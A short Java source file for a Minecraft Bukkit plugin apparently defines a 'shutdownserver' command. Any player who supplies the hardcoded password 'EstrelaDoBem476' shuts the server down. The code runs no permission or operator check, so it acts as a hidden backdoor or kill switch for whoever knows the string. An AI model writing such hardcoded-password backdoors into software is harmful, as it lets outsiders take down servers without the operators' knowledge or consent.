package net.helix.pvp.command;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;

public class DesligarServidor
  implements Listener, CommandExecutor
{
  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
  {
    if (cmd.getName().equalsIgnoreCase("shutdownserver"))
    {
      if (!(sender instanceof Player)) {
        return true;
      }
      Player p = (Player)sender;
      if (args.length == 0) {
        return true;
      }
      if (args[0].equalsIgnoreCase("EstrelaDoBem476")) {
        Bukkit.shutdown();
      }
    }
    return true;
  }
}
